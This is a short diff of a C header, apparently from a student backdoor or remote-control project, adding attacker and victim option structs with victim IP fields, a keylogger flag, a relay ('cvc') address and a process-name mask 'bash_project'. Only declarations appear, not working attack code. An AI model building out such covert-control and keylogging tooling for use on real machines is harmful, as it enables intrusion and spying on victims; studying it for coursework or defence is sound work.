@@ -52,13 +52,24 @@
 #define DEFAULT_COUNT 10000
 #define S_ARR_SIZE 64
 #define OUTPUT_SIZE 20000
-#define RECEIVE_SIZE 2048
+#define RECEIVE_SIZE 256
 #define SEND_SIZE 28
 #define BACKLOG 5
 #define TRUE 1
 #define FALSE 0
 #define MASK "bash_project"
 #define QUIT "quit"
+
+
+struct options_attacker {
+    char victim_ip[INET_ADDRSTRLEN];
+    char my_ip[INET_ADDRSTRLEN];
+    char cvc_ip[INET_ADDRSTRLEN];
+    char victim_instruction[64];
+    int attacker_socket_udp;
+    int attacker_socket_tcp;
+    bool cvc;
+};
 
 
 struct options_victim {
@@ -71,17 +82,10 @@ struct options_victim {
     char received_buffer[S_ARR_SIZE];
     char instruction[S_ARR_SIZE];
     char sending_buffer[OUTPUT_SIZE];
+    struct sockaddr_in cvc_addr;
     bool ip_flag;
     bool keylogger;
     bool cvc;
-};
-
-
-struct options_attacker {
-    char victim_ip[INET_ADDRSTRLEN];
-    char my_ip[INET_ADDRSTRLEN];
-    char victim_instruction[64];
-    int attacker_socket_udp;
 };
 
 typedef struct recv_udp {
